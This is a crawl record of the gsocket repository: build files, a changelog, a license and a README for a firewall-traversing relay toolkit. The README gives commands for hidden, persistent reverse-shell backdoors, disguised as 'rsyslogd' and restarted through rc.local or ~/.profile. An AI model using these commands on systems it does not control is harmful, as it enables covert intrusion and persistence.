{
  "metadata": {
    "timestamp": 1736710233461,
    "page": 966,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjk3MA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "hackerschoice/gsocket",
      "stars": 1573,
      "defaultBranch": "master",
      "files": [
        {
          "name": ".github",
          "type": "tree",
          "content": null
        },
        {
          "name": ".gitignore",
          "type": "blob",
          "size": 0.10546875,
          "content": "**/.DS_Store\nMakefile.in\n**/Makefile.in\naclocal.m4\nautom4te.cache/\nconfig.h.in\nconfig/\nconfigure\nconfigure~\n"
        },
        {
          "name": "ChangeLog",
          "type": "blob",
          "size": 0.9794921875,
          "content": "1.4.42 - 2024-05-22\n    * gcc _LARGEFILE_SOURCE fix\n\n1.4.41 - 2023-09-22\n    * OpenBSD support\n    * Transparent proxy detection\n    * muslcc localtime() bug work around\n\n1.4.40 - 2023-09-00\n    * Windows cmd.exe support\n    * SSL error printing\n\n.4.39 - 2022-09-01\n    * -t flag to check if peer is listening\n    * Software emulation of PTY if /dev/ptmx is unavailable\n    * Keepalive improved for Port 443 connections\n\n1.4.31-dev - 2021-06-08\n    * Protocol 1.3 - BREAKS BACKWARD COMPATIBILITY\n    * New Key Deriviation Method and fixed gs secret length\n    * -v, -vv and -vvv for verbosity\n    * Auto-Reconnect for -l (server) when DNS fails and keep re-trying\n      until success.\n    * Downgraded automake requirements to 2.69\n    * deploy.sh support for Raspberry PI 4b+ (armv7l)\n    * Debian HURD support (https://www.debian.org/ports/hurd/)\n    * unique exit() codes (thanks acpizer!)\n    * =Secret without quotes for easy cut & paste on windows (thanks CuCai!)\n    * CHANGELOG (thanks xaitax!)\n"
        },
        {
          "name": "LICENSE",
          "type": "blob",
          "size": 1.3291015625,
          "content": "/* \n * Copyright (C) 2002-3020 skyper@thc.org\n * All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions\n * are met:\n * 1. Redistributions of source code must retain the above copyright\n *    notice, this list of conditions and the following disclaimer.\n * 2. Redistributions in binary form must reproduce the above copyright\n *    notice, this list of conditions and the following disclaimer in the\n *    documentation and/or other materials provided with the distribution.\n *\n * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND\n * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\n * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE\n * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE\n * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL\n * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS\n * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)\n * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT\n * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY\n * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF\n * SUCH DAMAGE.\n */\n"
        },
        {
          "name": "Makefile.am",
          "type": "blob",
          "size": 0.177734375,
          "content": "SUBDIRS = lib tools man examples include\nEXTRA_DIST = README.md config bootstrap tests/Makefile tests/run_all_tests.sh tests/run_gs_tests.sh tests/run_ft_tests.sh LICENSE ChangeLog\n\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 15.73828125,
          "content": "# Global Socket\n<!---\nSee https://shields.io/category/license\n[![License: MIT](https://img.shields.io/github/license/hackerschoice/gsocket)](https://opensource.org/licenses/MIT)\n[![Github file count](https://img.shields.io/github/directory-file-count/hackerschoice/gsocket\\?style\\=plastic)](https://GitHub.com/hackerschoice/gsocket/)\n--->\n[![GitHub release](https://img.shields.io/github/release/hackerschoice/gsocket\\?style\\=plastic)](https://github.com/hackerschoice/gsocket/releases/)\n[![License](https://img.shields.io/badge/License-BSD%202--Clause-orange.svg?style=plastic)](https://opensource.org/licenses/BSD-2-Clause)\n[![GitHub Build](https://img.shields.io/badge/build-passing-green.svg\\?style\\=plastic\\&logo\\=appveyor)](https://www.gsocket.io/)\n[![GitHub Quality](https://img.shields.io/badge/quality-A-green.svg\\?style\\=plastic)](https://www.gsocket.io/)\n[![GitHub Platform](https://img.shields.io/badge/platform-linux\\|osx\\|cygwin\\|FreeBSD-green.svg\\?style\\=plastic)](https://www.gsocket.io/)\n[![GitHub coverage](https://img.shields.io/badge/coverage-100%25-green.svg\\?style\\=plastic)](https://www.gsocket.io/)\n[![Maintenance](https://img.shields.io/badge/Maintained-yes-green.svg\\?style\\=plastic)](https://github.com/hackerschoice/gsocket/graphs/commit-activity)\n[![Website shields.io](https://img.shields.io/website-up-down-green-red/http/www.gsocket.io.svg\\?style\\=plastic)](https://www.gsocket.io/)\n[![Github all downloads](https://img.shields.io/github/downloads/hackerschoice/gsocket/total\\?style\\=plastic)](https://GitHub.com/hackerschoice/gsocket/)\n[![GitHub telegram](https://img.shields.io/badge/chat-telegram-blue.svg\\?style\\=plastic\\&logo\\=telegram)](https://t.me/thcorg/)\n[![GitHub twitter](https://img.shields.io/twitter/follow/hackerschoice?label=Follow)](https://twitter.com/hackerschoice)\n[![GitHub stars](https://img.shields.io/github/stars/hackerschoice/gsocket\\?style\\=social)](https://GitHub.com/hackerschoice/gsocket/stargazers/)\n\n**Connect like there is no firewall. Securely.**\n\nThe Global Socket Tookit allows two users behind NAT/Firewall to establish a TCP connection with each other. Securely.  \n\nMore on [https://www.gsocket.io](https://www.gsocket.io).\n\n[![Watch the video](https://www.gsocket.io/assets/images/eeelite-console-640x378.png)](https://www.youtube.com/watch?v=tmf9VGDPILE)\n\nVideo 1: [gs-netcat reverse login shell and EEElite-console](https://www.youtube.com/watch?v=tmf9VGDPILE)  \nVideo 2: [Using gsocket to hijack OpenSSH](https://www.youtube.com/watch?v=Nn6BAeeVJIc)  \nVideo 3: [Blitz files through firewalls](https://www.thc.org/gsocket-anim2.gif)  \n\n\n**Features:**\n- Uses the Global Socket Relay Network to connect TCP pipes\n- End-2-End encryption (using OpenSSL's SRP / [RFC 5054](https://tools.ietf.org/html/rfc5054))\n- AES-256 & key exchange using 4096-bit Prime\n- No PKI required.\n- Perfect Forward Secrecy\n- TOR support (optional)\n\nAbandon the thought of IP Addresses and Port Numbers. Instead start thinking that two programs should be able to communicate with each other as long as they know the same secret (rather than each other\\'s IP Address and Port Number). The Global Socket library facilitates this: It locally derives temporary session keys and IDs and connects two programs through the Global Socket Relay Network (GSRN) regardless and independent of the local IP Address or geographical location. Once connected the library then negotiates a secure TLS connection(End-2-End). The secret never leaves your workstation. **The GSRN sees only the encrypted traffic**.\n\nThe [GSRN](https://www.gsocket.io/gsrn) is a free cloud service and is free to use by anyone.\n\nThe Global Socket Toolkit comes with a set of tools:\n* **gsocket** - Makes an existing program (behind firewall or NAT) accessible from anywhere in the world. It does so by analyzing the program and replacing the IP-Layer with its own Gsocket-Layer. A client connection to a hostname ending in *'\\*.gsocket'* then gets automatically redirected (via the GSRN) to this program.\n* **gs-netcat** - Netcat on steroids. Turn gs-netcat into an AES-256 encrypted reverse backdoor via TOR (optional) with a true PTY/interactive command shell (```gs-netcat -s MySecret -i```), integrated file-transfer, spawn a Socks4/4a/5 proxy or forward TCP connections or give somebody temporary shell access.\n* **gs-sftp** - sftp server & client between two firewalled workstations (```gs-sftp -s MySecret```)\n* **gs-mount** - Access and mount a remote file system (```gs-mount -s MySecret ~/mnt/warez```)\n* **blitz** - Copy data from workstation to workstation (```blitz -s MySecret /usr/share/*```)\n* ...many more examples and tools.\n\n<A></A>|<A></A>\n----------|-------------\nStatic| [pre-compiled static binaries for AMD64, ARM64, MIPS, ...](https://github.com/hackerschoice/gsocket/releases/latest)\nSource| [gsocket-1.4.41.tar.gz](https://github.com/hackerschoice/gsocket/releases/download/v1.4.40/gsocket-1.4.40.tar.gz) (Linux, MacOS, FreeBSD, OpenBSD, Solaris)\n.deb| [x86_64](https://github.com/hackerschoice/gsocket/releases/latest/download/gsocket_1.4.41_x86_64.deb), [aarch64](https://github.com/hackerschoice/gsocket/releases/latest/download/gsocket_1.4.41_aarch64.deb), ...[more architectures](https://github.com/hackerschoice/gsocket/releases/latest)\nWindows| [gs-netcat only](https://github.com/hackerschoice/binary/blob/main/gsocket/bin/gs-netcat_x86_64-cygwin_full.zip) or use docker or cygwin\nMan Page| [gsocket(1)](https://hackerschoice.github.io/gsocket.1.html), [gs-netcat(1)](https://hackerschoice.github.io/gs-netcat.1.html), [gs-mount(1)](https://hackerschoice.github.io/gs-mount.1.html), [gs-sftp(1)](https://hackerschoice.github.io/gs-sftp.1.html), [blitz(1)](https://hackerschoice.github.io/blitz.1.html)\nDocker|  docker run --rm -it hackerschoice/gsocket\nDocker| docker run --rm -it hackerschoice/gsocket-tor # gs via TOR\n\n---\n**Examples**\n<A></A>|<A></A>\n----------|-------------\nAll| [examples](examples)\nOpenSSH via GSRN| [examples/sshd](examples/sshd)  \nWireGuard via GSRN| [examples/wireguard](examples/wireguard)  \nRoot-Shell via GSRN| [examples/systemd-root-shell](examples/systemd-root-shell)  \nIRCD via GSRN| [examples/port-forward](examples/port-forward)  \n\n---\n<a id=\"installation-anchor\"></a>\nFollow the [Installation Instructions](https://github.com/hackerschoice/gsocket/blob/master/deploy/README.md) for all major Operating Systems.\n\n---\n**Usage:**\n\n1. Log in to Workstation A from Workstation B through any firewall/NAT\n```\n$ gs-netcat -l -i   # Workstation A\n$ gs-netcat -i      # Workstation B\n```\nSee also: [gs-netcat(1)](https://hackerschoice.github.io/gs-netcat.1.html)\n\n2. A Simple TCP forward\n```\n$ gs-netcat -l -d 127.0.0.1 -p 22  # Workstation A\n$ gs-netcat -p 2222                # Workstation B\n# A connection on B's port 2222 will end up on A's port 22\n$ nc -vn 127.0.0.1 2222            \n```\n\n3. SSH from *Workstation B* to *Workstation A* through any firewall/NAT\n```\n$ gsocket /usr/sbin/sshd     # Workstation A\n$ gsocket ssh root@gsocket   # Workstation B\n```\nSee also: [gsocket(1)](https://hackerschoice.github.io/gsocket.1.html)\n\n4. Transfer files from *Workstation B* to *Workstation A*<a id=\"blitz\"></a>\n```\n$ blitz -l                         # Workstation A\n$ blitz /usr/share/*  /etc/*       # Workstation B\n```\nSee also: [blitz(1)](https://hackerschoice.github.io/blitz.1.html)\n\n5. SFTP through Global Socket Relay Network\n```\n$ gs-sftp -l                  # Workstation A\n$ gs-sftp                     # Workstation B\n```\nSee also: [gs-sftp(1)](https://hackerschoice.github.io/gs-sftp.1.html)\n\n6. Mount *Workstation A's* directory from  *Workstation B*\n```\n$ gs-mount -l                # Workstation A\n$ gs-mount ~/mnt             # Workstation B\n```\nSee also: [gs-mount(1)](https://hackerschoice.github.io/gs-mount.1.html)\n\n7. Pipe data from Workstation B to Workstation A\n```\n$ gs-netcat -l -r >warez.tar.gz    # Workstation A\n$ gs-netcat <warez.tar.gz          # Workstation B\n```\n\n8. OpenVPN between two firewalled workstations:\n```\n$ gsocket openvpn --dev tun1 --proto tcp-server --ifconfig 10.9.8.1 10.9.8.2                   # Workstation A\n$ gsocket openvpn --dev tun1 --proto tcp-client --ifconfig 10.9.8.2 10.9.8.1 --remote gsocket  # Workstation B\n```\nSee also: [gsocket(1)](https://hackerschoice.github.io/gsocket.1.html)\n\n9. Execute any command (nc -e style) on *Workstation A*\n```\n$ gs-netcat -l -e \"echo hello world; id; exit\"   # Workstation A\n$ gs-netcat                                      # Workstation B\n```\n\nAnother example: Spawn a new docker environment deep inside a private network\n```\n# Start this on a host deep inside a private network\ngs-netcat -il -e \"docker run --rm -it kalilinux/kali-rolling\"\n```\n\nAccess the docker environment deep inside the private network from anywhere in the world:\n```\ngs-netcat -i\n```\n\nThis is particularly useful to allow fellow hackers to access a private network without having to give them access to the system itself.\n\n10. Quick Secure Chat with a friend\n```\n$ gs-full-pipe -s MySecret -A               # You\n$ gs-full-pipe -s MySecret -A               # Them\n```\n\n11. Access entirety of *Workstation A's* private LAN (Sock4/4a/5 proxy)\n```\n$ gs-netcat -l -S          # Workstation A (EXIT)\n$ gs-netcat -p 1080        # Workstation B\n\nAccess www.google.com via Workstation A's private LAN from your Workstation B:\n$ curl --socks4a 127.1:1080 http://www.google.com \n\nAccess fileserver.local:22 on Workstation A's private LAN from your Workstation B:\n$ socat -  \"SOCKS4a:127.1:fileserver.local:22\"\n```\n\nA far more powerful solution is to multiplex the TCP connection with [Gost](https://v2.gost.run/en/getting-started/):\n```\n### Workstation A (EXIT)\n$ gost -L mws://:40009 &\n$ gs-netcat -l -p 40009\n\n### Workstation B:\n$ gost -L :1080 -F 'mws://:40008' &\n$ gs-netcat -p 40008\n$ curl -x socks5h://0 ipinfo.io\n```\n\nThe packet goes from Curl -> Gost (Port 1080). It is then multiplexed into the single\nsingle TCP connection to B's gs-netcat (Port 40008) and forwarded via GSRN to A's gs-netcat.\nA's gs-netcat forwards the packet to A's Gost (Port 40009) where the stream is de-multiplexed\nand send to Gost's socks5 server and then forwarded to the Internet.\n\n12. Persistant, daemonized and auto-respawn/watchdog reverse PTY backdoor via TOR\n```\n$ gs-netcat -l -i -D    # some firewalled server\n$ gs-netcat -i -T       # You, via TOR\n```\n\n13. SoCAT 2 \n```\ngs-netcat can be used in a socat address-chain using the EXEC target. Happy bouncing. Enjoy. :> \n```\n---\n**Pro-Tips:**\n\n1. Force TOR or fail:\nAdd -T to relay your traffic through TOR or use these environment variable to force TOR or fail gracefully if TOR is not running:\n```\n$ export GSOCKET_SOCKS_IP=127.0.0.1\n$ export GSOCKET_SOCKS_PORT=9050\n```\n\n2. A reverse shell\n\nGs-netcat supports multiple concurrent connections and spawns a real PTY/interactive-shell with ctrl-c and colors working (like OpenSSH does).\n```\n$ gs-netcat -l -i    # Host\n$ gs-netcat -T -i    # Workstation (via Tor & Global Socket Relay)\n```\n\nAdd -D on the host side to start gs-netcat as a daemon and in watchdog-mode: Gs-netcat will restart automatically if killed.\n\n3. Use -k\n\nUsing -s is not secure. Add your *secret* to a file and use -k &lt;filen&gt; or use GSOCKET_ARGS=\"-s &lt;MySecret&gt;\".\n\n```\nGSOCKET_ARGS=\"-s MySecret\" gs-netcat -l\n```\n\nUse this command to generate a new secure password at random:\n```\ngs-netcat -g\n```\n\n4. Hide your arguments (argv)\n\nPass the arguments by environment variable (GSOCKET_ARGS) and use a bash-trick to hide gs-netcat binary in the process list:\n```\n$ export GSOCKET_ARGS=\"-s MySecret -li -q -D\"\n$ exec -a -bash ./gs-netcat &     # Hide as '-bash'.\n$ ps alxww | grep gs-netcat\n\n$ ps alxww | grep -bash\n  1001 47255     1   0  26  5  4281168    436 -      SNs    ??    0:00.00 -bash\n```\n\n5. SSH login to remote workstation\n```\n# On the remote workstation execute:\ngs-netcat -s MySecret -l -d 192.168.6.7 -p 22\n```\n```\n# Access 192.168.6.7 via ssh on the remote network from your workstation:\nssh -o ProxyCommand='gs-netcat -s MySecret' root@doesnotmatter\n```\n\n6. Retain access after reboot\n\nThe easiest way to retain access to a remote system is by using [the automated deploy script](https://www.gsocket.io/deploy). Alternatively the following can be used to achieve the same:\n\nCombine what you have learned so far and make your backdoor restart after reboot (and as a hidden service obfuscated as *rsyslogd*). Use any of the start-up scripts, such as */etc/rc.local*:\n```\n$ cat /etc/rc.local\n#! /bin/sh -e\n\nGSOCKET_ARGS=\"-s MySecret -liqD\" HOME=/root TERM=xterm-256color SHELL=\"/bin/bash\" /bin/bash -c \"cd $HOME; exec -a rsyslogd /usr/local/bin/gs-netcat\"\n\nexit 0\n```\nNot all environment variables are set during system bootup. Set some variables to make the backdoor more enjoyable: *TERM=xterm-256color* and *SHELL=/bin/bash* and *HOME=/root*. The startup script (*/etc/rc.local*) uses */bin/sh* which does not support our *exec -a* trick. Thus we use */bin/sh* to start */bin/bash* which in turn does the *exec -a* trick and starts *gs-netcat*. Puh. The gs-netcat process is hidden (as *rsyslogd*) from the process list. Read [how to enable rc.local](https://linuxmedium.com/how-to-enable-etc-rc-local-with-systemd-on-ubuntu-20-04/) if */etc/rc.local* does not exist.  \n\nAlternatively install gs-netcat as a [systemd service](examples/systemd-root-shell).\n\nAlternativly and if you do not have root privileges then just append the following line to the user's *~/.profile* file. This will start gs-netcat (if it is not already running) the next time the user logs in. There are [many other ways to restart a reverse shell after system reboot](https://www.gsocket.io/deploy):\n```\nkillall -0 gs-netcat 2>/dev/null || (GSOCKET_ARGS=\"-s MySecret -liqD\" SHELL=/bin/bash exec -a -bash /usr/local/bin/gs-netcat)\n```\n---\n**Crypto / Security Mumble Jumble**\n1. The security is end-2-end. This means from User-2-User (and not just to the Relay Network). The Relay Network relays only (encrypted) data to and from the Users. \n2. The session key is 256 bit and ephemeral. It is freshly generated for every session and generated randomly (and is not based on the password).\n3. The password can be 'weak' without weakening the security of the session. A brute force attack against a weak password requires a new TCP connection for every guess.\n4. Do not use stupid passwords like 'password123'. Malice might pick the same (stupid) password by chance and connect. If in doubt use *gs-netcat -g* to generate a strong one. Alice's and Bob's password should at least be strong enough so that Malice can not guess it by chance while Alice is waiting for Bob to connect.\n5. If Alice shares the same password with Bob and Charlie and either one of them connects then Alice can not tell if it is Bob or Charlie who connected.\n6. Assume Alice shares the same password with Bob and Malice. When Alice stops listening for a connection then Malice could start to listen for the connection instead. Bob (when opening a new connection) can not tell if he is connecting to Alice or to Malice. Use -a &lt;token&gt; if you worry about this. TL;DR: When sharing the same password with a group larger than 2 then it is assumed that everyone in that group plays nicely. Otherwise use SSH over the GS/TLS connection.\n7. SRP has Perfect Forward Secrecy. This means that past sessions can not be decrypted even if the password becomes known.\n8. It is possible (by using traffic analytics) to determine that Alice is communicating with Bob. The content of such communcitation is however secret (private)  and can not be revealed by an ISP or the GSRN backend. The gsocket tools (such as gs-netcat) support the -T flag to anonymize the traffic via TOR.\n9. I did not invent SRP. It's part of OpenSSL :>\n---\n\n             If netcat is a swiss army knife then gs-netcat is a germanic battle axe... \n                                                                    --acpizer/UnitedCrackingForce\n\nJoin us \n\nTelegram: https://t.me/thcorg \n\nTwitter: https://twitter.com/hackerschoice\n\nshoutz: D1G, [@xaitax](https://twitter.com/xaitax), #!adm\n"
        },
        {
          "name": "bootstrap",
          "type": "blob",
          "size": 0.7685546875,
          "content": "#! /bin/sh\n\nDIE=0\n\ncommand -v autoconf >/dev/null || {\n    echo \"You must have autoconf installed.\"\n\tDIE=1\n}\n\n# libtool --version check not done...\n\ncommand -v automake >/dev/null || {\n    echo \"You must have automake installed.\"\n    DIE=1\n}\n\nif test \"$DIE\" -eq 1; then\n    exit 1\nfi\n\necho Removing old files...\nrm -f configure Makefile Makefile.in tools/Makefile tools/Makesfile.in src/Makefile src/Makefile.in config.h config.status aclocal.m4 config.cache config.log\n[ -d \"config\" ] &&  rm -rf config\nmkdir config\n\necho \"aclocal -I .\"\naclocal -I . || exit\n\n# glibtoolize -c\n\necho \"autoheader\"\nautoheader || exit\necho \"automake --foreign --add-missing -Wno-syntax\"\nautomake --foreign --copy --add-missing -Wno-syntax || exit\necho \"autoconf\"\nautoconf || exit\necho \"BOOTSTRAP complete\"\n\n"
        },
        {
          "name": "configure.ac",
          "type": "blob",
          "size": 8.8603515625,
          "content": "dnl Process this File with autoconf to produce a configure script.\nAC_PREREQ([2.69])\nAC_INIT([gsocket],[1.4.42])\nAC_CONFIG_AUX_DIR(config)\nAC_CANONICAL_TARGET\n\ndnl we use automake\nAM_INIT_AUTOMAKE([foreign])\nAC_CONFIG_HEADERS(config.h)\nAM_PROG_AR\ndnl for --enable-maintainer-mode fun use:\ndnl AM_MAINTAINER_MODE \ndnl AC_DISABLE_STATIC\ndnl LT_INIT([disable-static])\n\ndnl AC_CONFIG_MACRO_DIRS([m4])\n\ndnl Checks for programs.\nAC_PROG_CC\nAC_PROG_INSTALL\nAC_PROG_RANLIB\nAC_CHECK_PROG([MAKE_CHECK], [make], [yes], [no])\nAS_IF([test x$MAKE_CHECK = xno], [AC_MSG_ERROR([make not found])])\n\ndnl\ndnl Use these compiler flags if we have gcc.\ndnl\nif test $ac_cv_c_compiler_gnu = yes; then\n  CCOPTS='-O2 -Wall'\n  CFLAGS=\"$CCOPTS $CFLAGS\"\nfi\ntest \"x$prefix\" != \"xNONE\" || prefix=\"/usr/local\"\ntest \"x$exec_prefix\" != \"xNONE\" || exec_prefix=\"${prefix}\"\n\ndnl Do \"gcc -xc -E -v -\" to figure out default paths\ndnl Scenarios\ndnl --prefix=$HOME/usr                                 => -I$HOME/usr/include /usr/include /usr/local/include\ndnl --prefix=/usr       --includedir=$HOME/usr/include => -I$HOME/usr/include /usr/include /usr/local/include\ndnl --prefix=/usr/local --includedir=$HOME/usr/include => -I$HOME/usr/include /usr/local/include /usr/include\n\ndnl default: PREFIX/include unless --includedir=\n\ndnl Try include paths (especially on OSX)\ndnl Special consideration if openssl/srp.h exist in $HOME/usr/include\ndnl and also the /usr/include/openssl exists. GCC shall use\ndnl $HOME/usr/include/openssl/srp.h first but not if $prefix is /usr or any\ndnl of the default system paths\ndnl To make everyone happy we have to consider:\ndnl --prefix=$HOME/usr          => Must _first_ add $HOME/usr/include\ndnl --prefix=/usr               => Must _never_ add /usr/include (or _last_)\n\ntest \"x$prefix\" != \"x/usr\" && test \"x$prefix\" != \"x/usr/local\" && trydir_i=\"${prefix}/include\"\ntrydir_i=\"${trydir_i} /usr/local/opt/openssl/include /opt/homebrew/opt/openssl/include\"\n\nfor xincdir in $includedir $trydir_i ; do\n\tif test ! -d \"$xincdir\" ; then\n\t\tcontinue;\n\tfi\n\tif test x\"${INCLUDES}\" = x; then\n\t\tINCLUDES=\"-I${xincdir}\";\n\telse\n\t\tINCLUDES=\"$INCLUDES -I${xincdir}\";\n\tfi\ndone\nCPPFLAGS=\"-I${srcdir}/../include ${INCLUDES} $CPPFLAGS\"\n\ndnl Try library paths...\ntest \"x$prefix\" != \"x/usr\" && test \"x$prefix\" != \"x/usr/local\" && trydir_l=\"${prefix}/lib\"\ntrydir_l=\"${trydir_l} /usr/local/opt/openssl/lib /opt/homebrew/opt/openssl/lib\"\nfor xlibdir in $libdir $trydir_l ; do\n\tif test ! -d \"$xlibdir\" ; then\n\t\tcontinue;\n\tfi\n\tif test -f \"${xlibdir}/libssl.a\"; then\n\t\tSTATIC_LIBSSLDIR=\"${xlibdir}\"\n\tfi\n\tif test x\"${LIBDIR}\" = x; then\n\t\tLIBDIR=\"-L${xlibdir}\";\n\telse\n\t\tLIBDIR=\"$LIBDIR -L${xlibdir}\";\n\tfi\ndone\nLDFLAGS=\"${LIBDIR} $LDFLAGS\"\n\ndnl default perm of .so is 644 but on cygwin must be 755.\nPERM_DSO=\"644\"\ncase \"$host\" in\n*-cygwin*)\n\tPERM_DSO=\"755\"\n\t;;\nmips-sony-bsd|mips-sony-newsos4)\n        AC_DEFINE([NEED_SETPGRP], [1], [Need setpgrp to acquire controlling tty])\n\t;;\n*-*-ultrix*)\n        AC_DEFINE([NEED_SETPGRP], [1], [Need setpgrp to acquire controlling tty])\n\t;;\n*-*-darwin*|*-*-*bsd*)\n\tAC_DEFINE([BSD_SCRIPT], [1], [/usr/bin/script is the bsd variant])\n\tif test x\"$(which ar)\" != x'/usr/bin/ar'; then\n\t\tARDIRWARN=1\n\tfi\n\t;;\nesac\n\ndnl debian packaging requires -soname for LD_PRELOAD libs\ndnl OSX's linker does not allow -soname.\nSONAME_GSOCKET_DSO=\"-Wl,-soname=gsocket_dso.so.0\"\nSONAME_GSOCKET_UCHROOT_DSO=\"-Wl,-soname=gsocket_uchroot_dso.so.0\"\ncase \"$host\" in\n*-*-darwin*)\n\tSONAME_GSOCKET_DSO=\"\"\n\tSONAME_GSOCKET_UCHROOT_DSO=\"\"\n\t;;\nesac\n\ndnl Checks for header files.\nAC_HEADER_SYS_WAIT\nAC_CHECK_HEADERS(sys/time.h sys/endian.h sys/param.h unistd.h fnmatch.h string.h utmp.h utmpx.h pty.h openssl/srp.h util.h libutil.h netinet/in_systm.h sys/loadavg.h libproc.h wordexp.h)\n\nAC_CHECK_HEADER(openssl/srp.h, [], [AC_MSG_ERROR([openssl/srp.h not found. Update OpenSSL or apt install libssl-dev?])])\n\ndnl Checks for typedefs, structures, and compiler characteristics.\nAC_C_CONST\nAC_TYPE_PID_T\n\ndnl Checks for library functions.\nAC_FUNC_MEMCMP\n\ndnl If size_t is not defined, define size_t to be unsigned. \nAC_TYPE_SIZE_T \ndnl If uid_t is not defined, define uid_t to be int and gid_t to be int.\nAC_TYPE_UID_T\n\nAC_ARG_ENABLE(static,\n[  --enable-static          Compile static binary],\n\t[STATIC=\"yes\"], [STATIC=\"no\"]\n)\n\ndnl OSX does not support static binaries.\ndnl At least staticly include OpenSSL libs\nif test x\"${STATIC}\" = xyes; then\n\tcase \"$host\" in\n\t*-*-darwin*)\n\t\tLDADD_STATIC=\"${STATIC_LIBSSLDIR}/libssl.a ${STATIC_LIBSSLDIR}/libcrypto.a\"\n\t\tAC_DEFINE(HAVE_LIBSSL, 1, [Define to 1 if you have the `ssl' library (-lssl)])\n\t\tAC_DEFINE(HAVE_LIBCRYPTO, 1, [Define to 1 if you have the `crypto' library (-lcrypto)])\n\t\tSTATIC_SSL=\"yes\"\n\t\t;;\n\t*)\n\t\tCFLAGS_STATIC=\"-static \"\n\t\t;;\n\tesac\nfi\n\nAC_CHECK_LIB(util, forkpty)\nAC_CHECK_LIB(socket, socket)\nif test x\"${STATIC}\" = xno; then\n  AC_CHECK_LIB(nsl, gethostbyname)\nfi\ndnl AC_CHECK_LIB([net], [libnet_name_resolve], [AC_MSG_ERROR([libnet 1.0.x found. Requires libnet 1.1 or newer])])\ndnl AC_CHECK_LIB([net], [libnet_init], ,[AC_MSG_ERROR([libnet 1.1.x not found])])\nif test x\"$STATIC\" = xno; then\n\tAC_CHECK_LIB(dl, dlopen)\nfi\nAC_CHECK_LIB(dl, dlopen, LDADD_LIBDL=\"-ldl\")\nAC_CHECK_LIB(procstat, procstat_close)\ndnl \nif test x\"$STATIC_SSL\" != xyes; then\n  AC_CHECK_LIB([crypto], [ENGINE_init], [], [AC_MSG_ERROR([libcrypto not found])])\n  AC_CHECK_LIB([ssl], [SRP_VBASE_get1_by_user], [], [AC_MSG_ERROR([SRP not supported. Please upgrade OpenSSL lib])])\nfi\n\nAC_CHECK_FUNCS(gettimeofday memcpy strchr strlcat forkpty openpty getline stat64 open64 statvfs64 accept4 connectx)\n\nAC_ARG_ENABLE([31337],\n\tAS_HELP_STRING([--enable-31337], [Enable experimental features.]),\n\tAC_DEFINE(D31337, 1, [Expermental feature])\n)\n\nAC_ARG_ENABLE([stealth],\n\tAS_HELP_STRING([--enable-stealth], [Stip -h and -m strings.]),\n\tAC_DEFINE(STEALTH, 1, [Stealth Mode])\n)\n\nAC_ARG_ENABLE([debug],\n\tAS_HELP_STRING([--enable-debug], [Enable debug information.]),\n\t[debug=true AC_DEFINE(DEBUG, 1, [Debug infos])]\n)\n\nAC_ARG_ENABLE([tests],\n\tAS_HELP_STRING([--enable-tests], [Enable self-tests.]),\n\t[selftests=true]\n)\n\nAS_IF([test x$enable_debug = xyes], AC_DEFINE(D31337, 1, [Expermental feature]))\nAS_IF([test x$enable_debug = xyes], [selftests=true])\n\nAS_IF([test x$selftests = xtrue], AC_DEFINE(SELFTESTS, 1, [Self Tests]))\n\nAC_ARG_ENABLE(dist,\n[  --enable-dist           Enable distribution mode, Use own libraries.],\n\t[DIST=\"yes\"], [DIST=\"no\"]\n)\n\nAC_ARG_ENABLE(realprefix,\n[  --enable-realprefix     Set real prefix (for dpkg packaging)],\n\t[REALPREFIX=\"${enableval}\"], [REALPREFIX=\"${prefix}\"]\n)\n\nAS_IF([test x$selftests = xtrue], AC_SUBST(PROGRAMS_TEST_LIB, \"list-test${EXEEXT} event-test${EXEEXT}\"))\nAS_IF([test x$selftests = xtrue], AC_SUBST(PROGRAMS_TEST_TOOLS, \"packet-test${EXEEXT} readline-test${EXEEXT} console_display-test${EXEEXT} filetransfer-test${EXEEXT}\"))\n\nAC_SUBST(LDADD_STATIC, \"${LDADD_STATIC}\")\nAC_SUBST(LDADD_LIBDL, \"${LDADD_LIBDL}\")\nAC_SUBST(CFLAGS_STATIC, \"${CFLAGS_STATIC}\")\nAC_SUBST(PERM_DSO, \"${PERM_DSO}\")\nAC_SUBST(SONAME_GSOCKET_DSO, \"${SONAME_GSOCKET_DSO}\")\nAC_SUBST(SONAME_GSOCKET_UCHROOT_DSO, \"${SONAME_GSOCKET_UCHROOT_DSO}\")\nAC_SUBST(REALPREFIX, \"${REALPREFIX}\")\nAC_CONFIG_FILES([Makefile lib/Makefile tools/Makefile include/Makefile include/gsocket/Makefile tools/gsocket.conf man/Makefile examples/Makefile])\nAC_OUTPUT\n\n\necho \"\n\n      \\\"If netcat is a swiss army knife then\n                        gs-netcat is a germanic battle axe\\\"\n\n\t                        --acpizer/United Cracking Force\n\"\n\nif test x\"${STATIC}\" = xyes; then\n\tcase \"$host\" in\n\t*-*-darwin*)\n\t\techo \"\n*** OSX does not support static binaries. Creating dynamic binaries ***\n*** instead and trying our best to included OpenSSL statically.     ***\n\"\n\t\t;;\n\t*)\n\t\techo \"\n********************************** WARNING ***********************************\n* Your MUST compile OpenSSL like this:                                       *\n* openssl-src>                                                               *\n* ./Configure --prefix=\\$HOME/usr no-dso no-threads no-shared linux-generic64 * \n* mkdir -p \\$HOME/usr && make install_sw                                      *\n* Only then compile gsocket \\(using the same --prefix=\\):                    *\n* gsocket-src> ./configure 